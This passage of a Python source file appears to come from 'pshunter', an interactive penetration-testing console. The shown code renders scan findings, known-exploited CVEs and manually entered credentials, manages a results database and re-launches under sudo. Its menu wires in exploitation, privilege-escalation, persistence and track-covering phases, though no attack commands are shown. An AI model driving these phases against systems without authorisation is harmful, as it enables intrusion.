        kev_hits = [c for c in ordered if c in kev]
        rest = [c for c in ordered if c not in kev]
        print(f"\n  {BOLD}CVE{RESET}")

        def _group(title, cves, col):
            print(f"    {title}")
            if cves:
                for c in cves:
                    print(f"      {col}{c}{RESET}  {DIM}{', '.join(sorted(cve_map[c]))}{RESET}")
            else:
                print(f"      {DIM}none{RESET}")

        _group(f"{BOLD}⚑ KEV CVE — known exploited{RESET}", kev_hits, RED)   # header neutral, CVEs red
        _group(f"{BOLD}other CVE{RESET}", rest, DIM)                          # rest → grey
    if host_scripts:
        print(f"\n  {BOLD}HOST FINDINGS{RESET}")
        for script, output in host_scripts:
            print(f"    {CYAN}{script}{RESET}")
            for line in (output or "").strip().split("\n"):
                print(f"        {line.rstrip()}")
    # user-entered data goes last, behind a separator, so its provenance is obvious —
    # everything above comes from the scans/tools; this block is what you typed in by hand.
    if manual:
        print(f"\n  {DIM}{'─' * 46}{RESET}")
        print(f"  {BOLD}{YELLOW}MANUALLY ENTERED{RESET} {DIM}(entered by you, not from the scan — feeds the scans/tools){RESET}")
        for mport, mproto, sid, output in manual:
            if sid == "manual-creds":
                for m in re.finditer(r"! (\S+):(\S+) @ (\S+) \(([^)]+)\)", output or ""):
                    pw = "" if m.group(2) == "<blank>" else m.group(2)
                    print(f"    {YELLOW}cred{RESET}  {mport}/{mproto:<5}"
                          f"{_cell(f'{m.group(1)}:{pw} @ {m.group(3)} ({m.group(4)})', 60)}")
            else:                                    # manual-paths
                host = ip
                for ln in (output or "").splitlines():
                    mh = re.match(r"^\[([^\]\s]+)\]\s*$", ln)
                    if mh:
                        host = mh.group(1)
                        continue
                    mp = re.match(r"\s*[!+] \d{3}\s+(\S+)", ln)
                    if mp:
                        tag = "" if host == ip else f"  {DIM}[{host}]{RESET}"
                        print(f"    {CYAN}path{RESET}  {mport}/{mproto:<5}"
                              f"{_cell(mp.group(1), 50)}{tag}")


def _render_port_scripts(ip: str, port: int, proto: str) -> None:
    """Print the full collected output for one port — every tool's raw result: service
    detection (-sC), the vuln scan (phase 4) and service exploitation (phase 6). The short
    one-line takeaways are summarised separately in [f] findings, not repeated here."""
    rows = fetch_scripts(ip, port, proto)          # all tools' output stored for this port
    print(f"\n{BOLD}{ip}:{port}/{proto} — DETAILS{RESET}")
    if not rows:
        print(f"  {DIM}None{RESET}")
        return
    # split scan-derived output from what the user typed in by hand (`a` add) so the
    # provenance is obvious — scanned first, then a separator, then the manual block.
    manual_sids = {"manual-creds": "credentials", "manual-paths": "paths"}
    scanned = [(s, o) for s, o in rows if s not in manual_sids]
    manual = [(s, o) for s, o in rows if s in manual_sids]

    if scanned:
        for script, output in scanned:
            print(f"  {CYAN}{script}{RESET}")
            for line in (output or "").strip().split("\n"):
                print(f"      {line.rstrip()}")
    else:
        print(f"  {DIM}No scan output for this port{RESET}")

    if manual:
        print(f"\n  {DIM}{'─' * 46}{RESET}")
        print(f"  {BOLD}{YELLOW}MANUALLY ENTERED{RESET} {DIM}(user-added, not from the nmap scan){RESET}")
        for script, output in manual:
            label = manual_sids.get(script, script)
            print(f"  {CYAN}{script}{RESET} {DIM}— {label}{RESET}")
            for line in (output or "").strip().split("\n"):
                print(f"      {line.rstrip()}")


def _port_scripts_view(ip: str, ports: list, n: int) -> None:
    """Sub-view for one port's -sC output: stays open (the ports table is NOT redrawn)
    until the user goes back."""
    if not 1 <= n <= len(ports):
        print(f"{RED}✗ no port {n}{RESET}")
        return
    port, proto, _state = ports[n - 1]

    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "a":
            _manual_add(ip)
            return "stay"                        # keep the info line — don't redraw
        if v == "r":
            _manual_remove(ip)
            return "refresh"
        if v == "f":
            _host_findings_view(ip)
            return "refresh"
        if v == "p":
            _open_host_progress(ip)
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— a · r · f · p · b · enter{RESET}")
        return "stay"

    _run_view(f"{ip}:{port}/{proto}",
              "[Enter] refresh · [a] add · [r] remove manual · [f] findings · [p] progress · [b] back · [m] menu",
              lambda: _render_port_scripts(ip, port, proto), _handle)


def _host_findings_view(ip: str) -> None:
    """Sub-view for one host's findings, opened with [f]; [p] jumps to its progress. Stays
    open (the ports table is NOT redrawn) until the user goes back."""
    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "a":
            _manual_add(ip)
            return "stay"                        # keep the info line — don't redraw the list
        if v == "r":
            _manual_remove(ip)
            return "refresh"
        if v == "p":
            _open_host_progress(ip)
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— a · r · p · b · enter{RESET}")
        return "stay"

    _run_view(f"{ip}/findings", "[Enter] refresh · [a] add · [r] remove manual · [p] progress · [b] back · [m] menu",
              lambda: _render_host_findings(ip), _handle)


def _host_ports_view(rows: list, n: int) -> None:
    """Sub-view for one host's ports: stays open (the host list is NOT redrawn) until the
    user goes back. A port number opens its -sC output; [f]/[p] jump to findings/progress."""
    if not 1 <= n <= len(rows):
        print(f"{RED}✗ no host {n}{RESET}")
        return
    ip = rows[n - 1][0]

    def _handle(ports, v):
        if v == "":
            return "refresh"
        if v == "a":
            _manual_add(ip)
            return "stay"                        # keep the info line — don't redraw the table
        if v == "r":
            _manual_remove(ip)
            return "refresh"
        if v.lower() == "f":
            _host_findings_view(ip)
            return "refresh"
        if v.lower() == "p":
            _open_host_progress(ip)
            return "refresh"
        if v.isdigit():
            n = int(v)
            if 1 <= n <= len(ports):
                _port_scripts_view(ip, ports, n)
                return "refresh"
            print(f"{RED}✗ no port {n}{RESET}")     # bad number → bare re-prompt, no redraw
            return "stay"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> · a · r · f · p · b · enter{RESET}")
        return "stay"

    _run_view(ip, "[Enter] refresh · <n> select · [a] add · [r] remove manual · [f] findings · [p] progress · [b] back · [m] menu",
              lambda: _render_host_ports(ip), _handle)


def clear_database() -> None:
    """Wipe all discovered hosts (and their ports/services) after confirmation."""
    if not os.path.exists(DB_PATH):
        print(f"\n{DIM}database already empty{RESET}")
        return
    ans = _ask("clear ALL discovered hosts (+ ports/services)? [y/N]:")
    if ans is None or ans.lower() != "y":
        print(f"{DIM}cancelled{RESET}")
        return
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for table in ("hosts", "ports", "services", "scripts", "vulns", "exploit_steps", "hostnames"):
                conn.execute(f"DELETE FROM {table}")
            conn.commit()
        finally:
            conn.close()
    print(f"{GREEN}✓ database cleared{RESET}")


def new_session() -> None:
    """Start a fresh session: abort any running scan and wipe the whole database —
    discovered hosts and the command history alike."""
    if not os.path.exists(DB_PATH) and not _JOBS:
        print(f"\n{DIM}already a clean session{RESET}")
        return
    ans = _ask("start a NEW session — wipe ALL data (hosts + history)? [y/N]:")
    if ans is None or ans.lower() != "y":
        print(f"{DIM}cancelled{RESET}")
        return
    with _JOBS_LOCK:
        for j in _JOBS:                   # stop anything still running
            if j["state"] == "running":
                j["cancel"].set()
        _JOBS.clear()
    if os.path.exists(DB_PATH):
        with _DB_LOCK:
            conn = _db_connect()
            try:
                for table in ("hosts", "jobs", "ports", "services", "scripts", "vulns",
                              "exploit_steps", "hostnames"):
                    conn.execute(f"DELETE FROM {table}")
                conn.commit()
            finally:
                conn.close()
    print(f"{GREEN}✓ new session — database cleared{RESET}")


def _upgrade_to_root() -> None:
    """Re-launch pshunter under sudo so SYN/UDP scans get raw-socket privileges. sudo
    itself handles the password (we never see it); progress lives in the DB, so the
    fresh root instance reloads everything. If the password prompt is cancelled we stay
    in the current (unprivileged) session."""
    if _is_root():
        print(f"\n{GREEN}already running as root{RESET}")
        return
    if not shutil.which("sudo"):
        print(f"\n{RED}✗ sudo not found — start it yourself with: sudo pshunter{RESET}")
        return
    running = any(j["state"] == "running" for j in _JOBS)
    note = " (running scans will restart)" if running else ""
    print(f"\n{BOLD}Upgrade to root{RESET}{DIM} — enter your sudo password when asked; "
          f"progress is saved in the database{note}.{RESET}")
    try:
        rc = subprocess.call(["sudo", "-v"])          # prompts on the tty, caches creds
    except OSError as exc:
        print(f"{RED}✗ could not run sudo: {exc}{RESET}")
        return
    if rc != 0:
        print(f"{DIM}upgrade cancelled — still running as a normal user{RESET}")
        return
    # Credentials cached: replace this process with a root one (no second prompt). Keep
    # PURRSH_TERM_ID so the in-app report spawn keeps working after the upgrade.
    print(f"{GREEN}▶ re-launching as root…{RESET}")
    sys.stdout.flush()
    script = os.path.abspath(__file__)
    try:
        os.execvp("sudo", ["sudo", "-n", "--preserve-env=PURRSH_TERM_ID",
                           sys.executable, script])
    except OSError as exc:
        print(f"{RED}✗ re-launch failed: {exc}{RESET}")


def _stop_job(groups: list, n: int) -> None:
    """Signal a running phase (by its status number) to abort — every still-running
    command in the group is killed within a tick; whatever each found so far is kept."""
    if not 1 <= n <= len(groups):
        print(f"{RED}✗ no scan {n}{RESET}")
        return
    grp = groups[n - 1]
    running = [j for j in grp if j["state"] == "running"]
    if not running:
        print(f"{DIM}{n} already {_agg_state([j['state'] for j in grp])}{RESET}")
        return
    for j in running:
        j["cancel"].set()
    print(f"{YELLOW}aborting {n}…{RESET}")


# External terminal emulators tried, in order, for the standalone spawn. The second
# item is the argv that precedes the program to run inside them ("-e" for most,
# "--" for gnome-terminal, "-x" for xfce4-terminal, nothing for kitty).
_TERM_EMULATORS = [
    ("x-terminal-emulator", ["-e"]), ("qterminal", ["-e"]), ("konsole", ["-e"]),
    ("xfce4-terminal", ["-x"]), ("gnome-terminal", ["--"]), ("tilix", ["-e"]),
    ("alacritty", ["-e"]), ("kitty", []), ("xterm", ["-e"]),
]


def _render_report_session(command: str, output: "str | None") -> str:
    """Build the coloured replay text: stock-Kali prompt (frame green/non-bold,
    user㉿host and $ bold-blue, ~ white) + greenish first command word (rest plain)
    + plain output. Kept in sync with the host app's in-tab renderer so both spawn
    paths look identical."""
    E = "\033"
    # cmd1 is the turquoise from QTermWidget's "Linux" scheme (Color6 = 24,178,178),
    # as 24-bit truecolor so the shade is stable across themes.
    grn, bblu, cmd1, wht, rs = (f"{E}[32m", f"{E}[1;34m", f"{E}[38;2;24;178;178m",
                                f"{E}[1;37m", f"{E}[0m")
    import getpass
    import socket
    try:
        user, host = getpass.getuser(), socket.gethostname()
    except Exception:
        user, host = "kali", "kali"
    first, _, rest = command.partition(" ")
    cmd = f"{cmd1}{first}{rs}" + (f" {rest}" if rest else "")
    prompt = (f"{grn}┌──({bblu}{user}㉿{host}{rs}{grn})-[{wht}~{rs}{grn}]{rs}\n"
              f"{grn}└─{bblu}${rs} {cmd}")
    return f"{prompt}\n{output or '(no output captured)'}\n"


def _spawn_report_in_app(job_id: int) -> None:
    """In-app path: emit an OSC 777 marker carrying only the job id. The PurrSh3ll
    host app parses it, reads the command/output from pshunter.db itself and opens
    a QTermWidget tab — so a scanned host cannot forge a command into this channel."""
    sys.stdout.write(f"\033]777;psspawn;{int(job_id)}\007")
    sys.stdout.flush()


def _spawn_report_standalone(job: dict) -> None:
    """Standalone path: render the replay ourselves and open it in an external
    terminal emulator (self-deleting temp file). Falls back to printing inline in the
    current terminal when there is no display or no emulator (e.g. over SSH)."""
    session = _render_report_session(job.get("command", ""), job.get("output"))
    term = next(((shutil.which(b), flag) for b, flag in _TERM_EMULATORS if shutil.which(b)),
                (None, None))
    have_display = os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")
    if not have_display or not term[0]:
        print()                                   # headless fallback: show it here
        sys.stdout.write(session)
        sys.stdout.flush()
        return
    binary, flag = term
    fd, path = tempfile.mkstemp(prefix="pshunter_report_", suffix=".txt")
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write(session)
        q = shlex.quote(path)
        script = f"clear; cat {q}; rm -f {q}; exec ${{SHELL:-/bin/bash}}"
        subprocess.Popen([binary] + flag + ["sh", "-c", script],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         stdin=subprocess.DEVNULL, start_new_session=True)
        print(f"{GREEN}opened scan output in a new terminal window{RESET}")
    except Exception as exc:
        _safe_unlink(path)
        print(f"{RED}✗ could not open a terminal: {exc}{RESET}")


def _view_command(groups: list, n: int, letter: str = "") -> None:
    """Show phase n's command(s) + output in a spawned terminal (variant B) — via the
    PurrSh3ll host app when running inside it, or an external terminal standalone. `v <n>`
    opens every finished command in the phase (one terminal each); `v <n><letter>` opens
    just that one lettered command."""
    if not 1 <= n <= len(groups):
        print(f"{RED}✗ no scan {n}{RESET}")
        return
    group = groups[n - 1]
    if letter:                                   # a single lettered command of the phase
        idx = ord(letter) - ord("a")
        if not 0 <= idx < len(group):
            print(f"{RED}✗ no command {n}{letter}{RESET} {DIM}(scan {n} has "
                  f"{len(group)}: {'-'.join(chr(ord('a') + k) for k in range(len(group)))}){RESET}")
            return
        j = group[idx]
        if j.get("db_id") is None or j["state"] == "running":
            print(f"{DIM}command {n}{letter} — no captured output yet{RESET}")
            return
        viewable = [j]
    else:
        viewable = [j for j in group
                    if j.get("db_id") is not None and j["state"] != "running"]
        if not viewable:
            print(f"{DIM}scan {n} — no captured output yet{RESET}")
            return
    if os.environ.get("PURRSH_TERM_ID"):
        for j in viewable:
            _spawn_report_in_app(j["db_id"])
        note = f" ({len(viewable)} cmds)" if len(viewable) > 1 else ""
        label = f"{n}{letter}" if letter else str(n)
        print(f"{GREEN}opened scan {label} output{note} in a new terminal{RESET}")
    else:
        for j in viewable:
            _spawn_report_standalone(j)


def _clear_status() -> None:
    """Drop finished commands from the history (in memory and in the DB); running
    scans are kept so they can still be watched or stopped."""
    with _JOBS_LOCK:
        kept = [j for j in _JOBS if j["state"] == "running"]
        removed = [j for j in _JOBS if j["state"] != "running"]
        _JOBS[:] = kept
    ids = [(j["db_id"],) for j in removed if j.get("db_id") is not None]
    if ids:
        with _DB_LOCK:
            conn = _db_connect()
            try:
                conn.executemany("DELETE FROM jobs WHERE id = ?", ids)
                conn.commit()
            finally:
                conn.close()
    print(f"{GREEN}✓ cleared {len(removed)} finished command(s){RESET}")


# ── action views (stay open until the user goes back) ─────────────────────────
def _run_view(module: str, options: str, render, handle=None) -> None:
    """Keep an interactive screen open. ``render()`` draws the content and may return a
    context passed to ``handle``. ``handle(ctx, v)`` returns 'refresh' to redraw the
    screen or 'stay' to just re-prompt WITHOUT redrawing — so an invalid option / typo
    doesn't reprint the whole view, only the bare prompt shows again. b / back / /exit
    leave. The options hint shows on the first prompt after a redraw, then bare."""
    first = True
    while True:
        if not first:
            _hr()
        first = False
        ctx = render()
        with_opts = True
        while True:
            v = _ctx_ask(module, options if with_opts else "")
            with_opts = False
            if v is None or v.lower() in _BACK_WORDS:
                return
            action = handle(ctx, v.strip().lower()) if handle else "stay"
            if action == "refresh":
                break                             # redraw the screen
            # 'stay' → re-prompt (bare), screen not redrawn


def _view(render, module: str, options: str = "[b] back") -> None:
    """Static screen (e.g. help): drawn once, kept open until the user goes back."""
    _run_view(module, options, render)


def _status_view() -> None:
    """Status screen: refresh, view a scan's command + output in a spawned terminal
    (``v <n>``), stop a running scan (``stop <n>``), or clear finished history."""
    def _handle(jobs, v):
        if v == "":
            return "refresh"
        if v == "c":
            _clear_status()
            return "refresh"
        if v.startswith("stop"):
            rest = v[len("stop"):].strip()
            if rest.isdigit():
                _stop_job(jobs, int(rest))
                return "refresh"
            print(f"{RED}✗ use: stop <n>{RESET}")
            return "stay"
        mv = re.match(r"v\s*(\d+)([a-z]?)$", v)      # v <n>  or  v <n><letter> (one command)
        if mv:
            _view_command(jobs, int(mv.group(1)), mv.group(2))
            return "stay"
        if v.startswith("v"):
            print(f"{RED}✗ use: v <n>  or  v <n><letter>{RESET}")
            return "stay"
        if v.isdigit():
            _stop_job(jobs, int(v))
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} "
              f"{DIM}— v <n> · v <n><letter> · stop <n> · c · b · enter{RESET}")
        return "stay"

    _run_view("status", "[Enter] refresh · v <n>[a-z] view · stop <n> abort · [c] clear · [b] back",
              show_status, _handle)


def _database_view() -> None:
    """Database screen: host list; type a host number to see its ports/services,
    ``r <n>`` to remove a host, ``c`` to clear, ``b`` to go back."""
    def _handle(rows, v):
        if v == "":
            return "refresh"
        if v == "a":
            _manual_add_host()
            return "stay"                        # keep the info line — don't redraw the table
        if v == "c":
            clear_database()
            return "refresh"
        if v.startswith("r"):
            rest = v[1:].strip()
            if rest.isdigit():
                _delete_host(rows, int(rest))
                return "refresh"
            print(f"{RED}✗ use: r <n>{RESET}")
            return "stay"
        if v.isdigit():
            _host_ports_view(rows, int(v))
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> · a · r <n> · c · b · enter{RESET}")
        return "stay"

    _run_view("database",
              "[Enter] refresh · <n> select · [a] add host · r <n> remove · [c] clear · [b] back",
              show_database, _handle)


# ── supported-services catalog (reference: what the app covers, and each service's steps) ──
def _service_wired_count(key: str) -> tuple:
    """(#runnable-steps, #total-steps) for a service class — a step is runnable when it
    carries copy-paste commands in the phase-5 playbook."""
    steps = _EXPLOIT_STEPS.get(key) or []
    cmds = _STEP_COMMANDS.get(key, {})
    return sum(1 for i in range(1, len(steps) + 1) if cmds.get(i)), len(steps)


def _render_services_catalog() -> list:
    """Numbered list of every service the app knows, in exploitation-priority (implementation)
    order. Services with at least one wired tool are bold (implemented); the rest are dim
    (checklist only, no automation yet). Returns the ordered services so a number can pick one."""
    print(f"\n{BOLD}supported services{RESET}  "
          f"{DIM}exploitation order · {BOLD}bold{RESET}{DIM} = has copy-paste commands{RESET}")
    rows = []
    for i, (key, label, ports, _tokens) in enumerate(_EXPLOIT_SERVICES, 1):
        wired, total = _service_wired_count(key)
        name = f"{BOLD}{label}{RESET}" if wired > 0 else f"{DIM}{label}{RESET}"
        steps_cell = str(total) if total else "—"
        pr = ", ".join(str(p) for p in sorted(ports)[:5]) + ("…" if len(ports) > 5 else "")
        rows.append([str(i), name, _cell(pr, 20), steps_cell])
    print(_box_table(["#", "SERVICE", "PORTS", "STEPS"], rows, aligns=["r", "l", "l", "l"]))
    return list(_EXPLOIT_SERVICES)


def _render_service_steps(key: str, label: str) -> None:
    """One service's checklist as a static reference (no host / no status): each step, bold
    with a ● when it carries copy-paste commands, dim ○ otherwise; the commands (lettered
    a–z, with <PLACEHOLDERS>) are listed beneath it."""
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
    playbook = _STEP_COMMANDS.get(key) or _STEP_COMMANDS["other"]
    print(f"\n{BOLD}{label} — checklist{RESET}")
    print()
    for i, step in enumerate(steps, 1):
        desc, _ = _step_parts(step)
        cmds = playbook.get(i)
        mark = f"●" if cmds else f"{DIM}○{RESET}"
        text = f"{BOLD}{desc}{RESET}" if cmds else f"{DIM}{desc}{RESET}"
        print(f"  {CYAN}{i:>2}{RESET} {mark} {text}")
        for j, c in enumerate(cmds or []):
            print(f"        {DIM}{chr(ord('a') + j)}{RESET}  {c}")


def _services_catalog_view() -> None:
    """Catalog screen: list supported services (implemented ones bold); a number opens that
    service's steps as a read-only reference."""
    def _handle(services, v):
        if v == "":
            return "refresh"
        if v.isdigit():
            n = int(v)
            if 1 <= n <= len(services):
                key, label = services[n - 1][0], services[n - 1][1]
                _view(lambda: _render_service_steps(key, label), f"catalog/{key}", "[b] back")
                return "refresh"
            print(f"{RED}✗ no service {n}{RESET}")
            return "stay"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> · enter · b{RESET}")
        return "stay"

    _run_view("catalog", "[Enter] refresh · <n> view steps · [b] back · [m] menu",
              _render_services_catalog, _handle)


# ── main loop ─────────────────────────────────────────────────────────────────
def main() -> int:
    if any(a in ("-h", "--help") for a in sys.argv[1:]):
        print_help()      # `pshunter -h/--help` (also used by `pshelp pshunter`)
        return 0
    print_header()
    if os.path.exists(DB_PATH):        # apply any pending schema migrations up front
        with _DB_LOCK:
            _db_connect().close()      # (so raw reads like fetch_hosts see new columns)
    _load_jobs()          # restore the saved command history
    _reconcile_hosts_on_start()          # clear any /etc/hosts residue from a prior session
    atexit.register(_remove_all_pshunter_hosts)   # best-effort cleanup on a graceful exit
    try:
        while True:
            print_menu()
            while True:                       # prompt loop: a typo re-prompts bare, the
                try:                          # menu is only reprinted after a real action
                    choice = input(f"{BOLD}{CYAN}[menu]{RESET}{DIM} ›{RESET} ").strip().lower()
                except (EOFError, KeyboardInterrupt):
                    print(f"\n{DIM}bye.{RESET}")
                    return 0

                if choice in ("/exit", "\\exit", "exit", "q", "quit"):
                    print(f"{DIM}bye.{RESET}")
                    return 0
                try:
                    if choice in _HELP_WORDS:
                        _view(print_help, "help")
                    elif choice == "0":
                        _handle_host_discovery()
                    elif choice == "1":
                        _handle_port_enum()
                    elif choice == "2":
                        _handle_service_detection()
                    elif choice == "3":
                        _handle_vuln_scan()
                    elif choice == "4":
                        _handle_cve_lookup()
                    elif choice == "5":
                        _handle_service_exploitation()
                    elif choice == "6":
                        _handle_privesc()
                    elif choice == "7":
                        _handle_persist()
                    elif choice == "8":
                        _handle_cover()
                    elif choice in _PHASES:
                        run_phase(choice)
                    elif choice in ("s", "status"):
                        _status_view()
                    elif choice in ("d", "database"):
                        _database_view()
                    elif choice in ("c", "catalog", "services"):
                        _services_catalog_view()
                    elif choice in ("n", "new"):
                        new_session()
                    elif choice in ("u", "upgrade") and not _is_root():
                        _upgrade_to_root()
                    elif choice in _MENU_WORDS:
                        pass                  # already at the menu → just redraw it
                    else:
                        print(f"{RED}✗ pick 0-8, s, d, c, n, h or /exit{RESET}")
                        continue              # invalid → bare re-prompt, menu not reprinted
                except _ToMenu:               # m/menu typed inside a sub-view → back here
                    pass
                break                         # a valid action ran → redraw the menu

            print(f"{DIM}{'─' * 56}{RESET}\n")
    except _ExitApp:          # /exit typed at any sub-prompt
        print(f"\n{DIM}bye.{RESET}")
        return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print()
        sys.exit(130)
